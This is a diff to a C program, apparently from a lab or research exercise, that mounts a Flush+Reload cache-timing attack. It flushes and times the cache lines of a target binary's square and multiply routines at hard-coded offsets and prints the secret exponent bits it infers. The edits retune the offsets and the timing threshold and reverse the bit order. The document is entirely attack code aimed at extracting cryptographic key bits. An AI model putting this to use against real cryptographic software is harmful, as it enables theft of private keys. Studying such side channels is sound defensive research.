@@ -12,10 +12,11 @@
 #include <string.h>
 #include <x86intrin.h>
 
-const int T_multiply = 0x1210;
-const int T_square = 0x11e7;
-int i = 0;
+const int T_multiply = 0x1280;
+const int T_square = 0x1200;
+int i = 7;
 int j = 0;
+int total = 10000;
 
 
 static inline uint64_t rdtsc_begin(void) {
@@ -44,14 +45,14 @@ int main (int argc, char *argv[]){
     char *multiply = (char *) map + T_multiply;
     uint64_t diff = 0;
     uint64_t sum;
+    
 
-    while(i<8) {
+    while(i>=0) {
         _mm_clflush(square);
         _mm_clflush(multiply);
    
-        for (volatile int i = 0; i < 100000; i++);
-        sum = 0;
-        j = 0;
+        for (volatile int j = 0; j < 100000; j++);
+
   
             uint64_t t0 = rdtsc_begin();
             volatile char v = *square;
@@ -66,13 +67,16 @@ int main (int argc, char *argv[]){
         
         printf("time_square: %lu, time_multiply: %lu\n", time_square, time_multiply);
 
-        if (time_multiply > 280) {
+      
+
+        if (total > 400 && (time_multiply) > 0.4*total) {
             printf("bit %d is: %d\n", i, 0);
         }
         else {
             printf("bit %d is: %d\n", i, 1);
         } 
-    i ++;
+        total = time_multiply+time_square;
+    i --;
     }
         
 }
